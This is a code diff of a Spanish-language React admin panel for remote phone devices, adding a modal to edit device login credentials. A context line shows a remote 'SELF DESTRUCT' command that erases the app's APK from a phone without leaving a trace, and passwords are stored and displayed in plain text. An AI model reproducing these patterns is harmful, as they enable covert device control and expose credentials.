@@ -107,11 +107,14 @@ export default function AdminPage() {
   const [showDeleteModal, setShowDeleteModal] = useState(false);
   const [showEditModal, setShowEditModal] = useState(false);
   const [showSubsModal, setShowSubsModal] = useState(false);
-  
+  const [showCredsModal, setShowCredsModal] = useState(false);
+
   const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
   const [newDeviceId, setNewDeviceId] = useState('');
   const [newDeviceName, setNewDeviceName] = useState('');
   const [editDeviceName, setEditDeviceName] = useState('');
+  const [credsUsername, setCredsUsername] = useState('');
+  const [credsPassword, setCredsPassword] = useState('');
   const [isActionLoading, setIsActionLoading] = useState(false);
   
   // Nuevos estados para Tabs, Planes y Suscripciones
@@ -295,15 +298,6 @@ export default function AdminPage() {
     } catch (e) { console.warn('Error copying to clipboard:', e); }
   };
 
-  const copyAllCreds = async (idx: number) => {
-    const d = devices[idx];
-    const text = `Usuario: ${d.username || '-'}\nContraseña: ${d.password || '-'}\nDevice ID: ${d.device_id}`;
-    try {
-      await navigator.clipboard.writeText(text);
-      showToast('Credenciales copiadas');
-    } catch (e) { console.warn('Error copying all creds:', e); }
-  };
-
   const resetCreds = async (idx: number) => {
     const d = devices[idx];
     setIsActionLoading(true);
@@ -426,6 +420,36 @@ export default function AdminPage() {
     }
   };
 
+  const saveCredentials = async () => {
+    if (!selectedDevice || !credsUsername.trim() || !credsPassword.trim()) {
+      showToast('Usuario y contraseña son requeridos');
+      return;
+    }
+    setIsActionLoading(true);
+    try {
+      const res = handleAuthResponse(await fetch(API + `/devices/${selectedDevice.device_id}`, {
+        method: 'PATCH',
+        headers: adminHeaders({ 'Content-Type': 'application/json' }),
+        body: JSON.stringify({ username: credsUsername.trim(), password: credsPassword.trim() }),
+      }));
+      if (res.ok) {
+        await loadDevices();
+        setShowCredsModal(false);
+        setSelectedDevice(null);
+        setCredsUsername('');
+        setCredsPassword('');
+        showToast('Credenciales actualizadas');
+      } else {
+        showToast('Error al actualizar credenciales');
+      }
+    } catch (err) {
+      console.error('Error actualizando credenciales:', err);
+      showToast('Error de conexión');
+    } finally {
+      setIsActionLoading(false);
+    }
+  };
+
   const runMaintenance = async () => {
     setIsActionLoading(true);
     try {
@@ -495,6 +519,13 @@ export default function AdminPage() {
     setSelectedDevice(device);
     setEditDeviceName(device.name || device.device_id);
     setShowEditModal(true);
+  };
+
+  const openCredsModal = (device: Device) => {
+    setSelectedDevice(device);
+    setCredsUsername(device.username || '');
+    setCredsPassword(device.password || '');
+    setShowCredsModal(true);
   };
 
   const openSubsModal = async (device: Device) => {
@@ -782,7 +813,7 @@ export default function AdminPage() {
                           <button className="action-btn btn-danger-zone" data-testid={`cmd-self-destruct-${d.device_id}`} onClick={e => { e.stopPropagation(); if(confirm('¿SEGURO? Esto borrará el APK del teléfono sin dejar rastro.')) sendCommand(d.device_id, 'self_destruct'); }} style={{ background: 'rgba(255,0,0,0.2)', color: '#ff0033', borderColor: 'rgba(255,0,0,0.5)', justifyContent: 'center' }} title="Desinstala y borra el APK del teléfono">☢️ SELF DESTRUCT</button>
                         </div>
                         <div className="device-actions">
-                          <button className="action-btn btn-copy-all" data-testid={`copy-all-creds-${d.device_id}`} onClick={e => { e.stopPropagation(); copyAllCreds(i); }}>
+                          <button className="action-btn btn-copy-all" data-testid={`edit-creds-${d.device_id}`} onClick={e => { e.stopPropagation(); openCredsModal(d); }}>
                             <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                             Credenciales
                           </button>
@@ -1221,6 +1252,69 @@ export default function AdminPage() {
                 disabled={isActionLoading}
                 className="modal-btn modal-btn-primary"
                 data-testid="edit-device-confirm"
+              >
+                {isActionLoading ? 'Guardando...' : 'Guardar'}
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Modal de Credenciales del dispositivo */}
+      {showCredsModal && selectedDevice && (
+        <div className="modal-overlay" onClick={() => setShowCredsModal(false)}>
+          <div className="modal-content" onClick={e => e.stopPropagation()}>
+            <h2 className="modal-title">Credenciales: {selectedDevice.name || selectedDevice.device_id}</h2>
+            <p style={{ fontSize: '0.8rem', color: 'rgba(255,255,255,0.5)', marginBottom: '16px' }}>
+              Usuario y contraseña para que este dispositivo inicie sesión en el panel.
+            </p>
+            <div style={{ marginBottom: '16px' }}>
+              <label className="modal-label">Usuario</label>
+              <input
+                type="text"
+                value={credsUsername}
+                onChange={(e) => setCredsUsername(e.target.value)}
+                placeholder="ej: phone-cesar"
+                className="modal-input"
+                data-testid="creds-username-input"
+              />
+            </div>
+            <div style={{ marginBottom: '24px' }}>
+              <label className="modal-label">Contraseña</label>
+              <div style={{ display: 'flex', gap: 8 }}>
+                <input
+                  type="text"
+                  value={credsPassword}
+                  onChange={(e) => setCredsPassword(e.target.value)}
+                  placeholder="Contraseña"
+                  className="modal-input"
+                  style={{ marginBottom: 0 }}
+                  data-testid="creds-password-input"
+                />
+                <button
+                  type="button"
+                  className="btn-primary-small"
+                  data-testid="creds-generate-password"
+                  onClick={() => setCredsPassword(generateCredential())}
+                >
+                  Generar
+                </button>
+              </div>
+            </div>
+            <div className="modal-actions">
+              <button
+                onClick={() => { setShowCredsModal(false); setSelectedDevice(null); setCredsUsername(''); setCredsPassword(''); }}
+                disabled={isActionLoading}
+                className="modal-btn modal-btn-cancel"
+                data-testid="creds-cancel"
+              >
+                Cancelar
+              </button>
+              <button
+                onClick={saveCredentials}
+                disabled={isActionLoading}
+                className="modal-btn modal-btn-primary"
+                data-testid="creds-confirm"
               >
                 {isActionLoading ? 'Guardando...' : 'Guardar'}
               </button>
